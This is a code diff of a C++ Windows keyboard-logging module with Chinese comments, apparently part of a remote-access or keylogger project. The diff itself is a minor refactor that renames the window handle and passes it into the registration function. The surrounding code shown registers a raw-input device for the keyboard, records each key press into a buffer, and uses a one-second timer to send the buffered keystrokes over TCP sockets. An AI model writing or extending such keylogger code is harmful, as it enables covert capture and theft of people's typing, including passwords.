@@ -2,10 +2,10 @@
 #include "Keybd.h"
 #include "VirtualKeyToAscii.h"
 
-// 此关键段是用来保护 socket vector
+// 此关键段用来保护 socket vector
 static CRITICAL_SECTION gCs;
 static Keybd gKbd; // 初始化类
-static HWND hWnd = NULL; // 窗口句柄
+static HWND s_hWnd = NULL; // 窗口句柄
 static std::vector<TcpSocket*> gSockets; // socket 列表
 static std::vector<char> gBuffer; // 键盘数据缓冲区
 
@@ -24,9 +24,9 @@ Keybd::Keybd()
 
 Keybd::~Keybd()
 {
-	if (hWnd) {
+	if (s_hWnd) {
 		// 关闭计时器
-		KillTimer(hWnd, 0);
+		KillTimer(s_hWnd, 0);
 		// 删除socket
 		const int max = gSockets.size();
 		for (int i = 0; i < max; ++i) {
@@ -34,7 +34,7 @@ Keybd::~Keybd()
 			delete gSockets.at(i);
 		}
 		// 关闭窗口
-		DestroyWindow(hWnd);
+		DestroyWindow(s_hWnd);
 
 	}
 	// 删除关键段
@@ -89,8 +89,11 @@ BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
 {
 	switch (uiMsg) {
 	case WM_INITDIALOG: {
+		// 首先得到该对话框窗口句柄
+		s_hWnd = hWnd;
 		// 注册原始输入设备 开始监键盘数据
-		regist();
+		regist(hWnd);
+		// 为该对话框关联计时器
 		// 使用计时器定时发送缓存的键盘记录信息
 		const int time = 1000;
 		SetTimer(hWnd, 0, time, sendKeybdData);
@@ -111,7 +114,7 @@ BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
 }
 
 // 注册原始设备
-BOOL Keybd::regist() {
+BOOL Keybd::regist(HWND hWnd) {
 	// 设置 RAWINPUTDEVICE 结构体信息 指定要监听键盘
 	RAWINPUTDEVICE rawinputDevice = { 0 };
 	rawinputDevice.usUsagePage = 0x01;
@@ -143,7 +146,7 @@ BOOL Keybd::getKeybdData(LPARAM lParam) {
 		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
 			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
 		{
-			// 记录按键
+			// 记录按键并存储到类缓冲区
 			saveKey(rawinputData.data.keyboard.VKey);
 		}
 	}
